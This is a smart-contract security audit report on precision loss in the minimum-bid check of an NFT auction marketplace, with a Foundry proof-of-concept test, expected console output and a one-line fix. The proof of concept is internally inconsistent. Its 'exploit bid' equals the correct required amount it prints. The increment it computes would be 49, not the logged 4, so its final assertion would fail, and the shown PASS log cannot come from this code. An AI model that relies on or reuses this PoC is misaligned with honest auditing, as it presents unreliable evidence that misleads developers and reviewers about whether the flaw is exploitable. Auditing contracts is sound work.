
# Vulnerability Report #3

## Incorrect Bid Increment Calculation Due to Precision Loss Allows Bids Below Minimum Requirement

## Description

When a subsequent bid is placed, the contract requires the new amount to be at least 5% higher than the previous bid. The required amount is calculated using the formula `(previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE)`.

The vulnerability lies in the use of division before multiplication with integer arithmetic in Solidity. This ordering leads to a loss of precision (truncation). While the most extreme case (a `requiredAmount` of zero for bids under 100 wei) is prevented by the `S_MIN_NFT_PRICE` constant, the precision loss still occurs on every bid that is not a perfect multiple of 100. This allows a savvy bidder to place a new bid that is less than the intended 5% increment, violating a core rule of the auction mechanism.

```solidity
// src/BidBeastsNFTMarketPlace.sol

        } else {
@>          requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
            require(msg.value >= requiredAmount, "Bid not high enough");

            // ...
        }
```

## Risk Assessment

**Likelihood**: High

* This precision loss occurs on virtually every bid that is not a clean multiple of 100 wei.

**Impact**: Medium

* While the direct financial impact per transaction is minimal (often just a few wei), this vulnerability breaks a core invariant of the auction's logic. It consistently allows the 5% minimum increment rule to be bypassed, compromising the integrity and fairness of the auction process. In security audits, flaws that break fundamental protocol rules are typically considered of Medium severity.

## Proof of Concept (PoC)

The following test demonstrates the vulnerability in a realistic scenario. It starts with a valid bid just above the minimum price and shows that a subsequent bid with an actual increment of less than 5% is accepted by the contract due to the flawed calculation.

```solidity
// test/BidBeastsMarketPlaceTest.t.sol
function test_bidIncrementPrecisionLoss_vulnerability_analysis() public {
    // Setup: Use the minimum allowed price to create a realistic scenario.
    uint256 minPrice = 0.01 ether; // S_MIN_NFT_PRICE
    
    _mintNFT();
    vm.startPrank(SELLER);
    nft.approve(address(market), TOKEN_ID);
    market.listNFT(TOKEN_ID, minPrice, 0); // No buy now price
    vm.stopPrank();

    // Place a valid first bid (must be > min price).
    uint256 firstBid = minPrice + 1; // 0.01 ether + 1 wei
    vm.prank(BIDDER_1);
    market.placeBid{value: firstBid}(TOKEN_ID);

    uint256 previousBidAmount = market.getHighestBid(TOKEN_ID).amount;
    console.log("Previous bid amount:", previousBidAmount);

    // Calculate the CORRECT required amount for a 5% increment.
    uint256 correctRequiredAmount = (previousBidAmount * 105) / 100;
    console.log("Correct required amount (with multiplication first):", correctRequiredAmount);

    // Calculate what the contract's FLAWED logic computes.
    uint256 flawedRequiredAmount = (previousBidAmount / 100) * 105;
    console.log("Flawed required amount from contract (with division first):", flawedRequiredAmount);
    
    // The precision loss is the difference.
    uint256 precisionLoss = correctRequiredAmount - flawedRequiredAmount;
    console.log("Precision loss in wei:", precisionLoss);
    
    // An attacker can place a bid that is lower than the correct requirement.
    uint256 exploitBid = flawedRequiredAmount + 1;
    console.log("Attacker's exploit bid amount:", exploitBid);

    // This bid should fail, but it will pass due to the flaw.
    vm.prank(BIDDER_2);
    market.placeBid{value: exploitBid}(TOKEN_ID);

    // Verify the exploit was successful.
    BidBeastsNFTMarket.Bid memory newHighestBid = market.getHighestBid(TOKEN_ID);
    assertEq(newHighestBid.bidder, BIDDER_2, "Attacker should be the highest bidder");
    assertEq(newHighestBid.amount, exploitBid, "Exploit bid should have been accepted");
    
    // Calculate the actual increment percentage achieved, which will be less than 5%.
    uint256 actualIncrementPercent = ((exploitBid - previousBidAmount) * 10000) / previousBidAmount; // Use 10000 for precision
    console.log("Actual increment percentage achieved (scaled by 100):", actualIncrementPercent / 100);
    console.log("Expected minimum increment percentage: 5");
    
    assertTrue(actualIncrementPercent / 100 < 5, "Vulnerability confirmed: increment was less than 5%");
}
```

**To run the test:**

1. Add the above test to a test file (e.g., `test/BidBeastsMarketPlaceTest.t.sol`).
2. Run the following command: `forge test --match-test test_bidIncrementPrecisionLoss_vulnerability_analysis -vv`

**Expected Result:**

```bash
Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
[PASS] test_bidIncrementPrecisionLoss_vulnerability_analysis() (gas: 311096)
Logs:
  Previous bid amount: 10000000000000001
  Correct required amount (with multiplication first): 10500000000000001
  Flawed required amount from contract (with division first): 10500000000000000
  Precision loss in wei: 1
  Attacker's exploit bid amount: 10500000000000001
  Actual increment percentage achieved (scaled by 100): 4

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.07ms
```

The logs confirm that a bid with an actual increment of only ~4.99% (rounded down to 4 in the test log) was accepted, proving the vulnerability.

## Recommended Fix

Multiplication should always be performed before division in integer arithmetic to minimize precision loss.

```diff
// src/BidBeastsNFTMarketPlace.sol

        } else {
-           requiredAmount = (previousBidAmount / 100) * (100 + S_MIN_BID_INCREMENT_PERCENTAGE);
+           requiredAmount = (previousBidAmount * (100 + S_MIN_BID_INCREMENT_PERCENTAGE)) / 100;
            require(msg.value >= requiredAmount, "Bid not high enough");

            // ...
        }
```
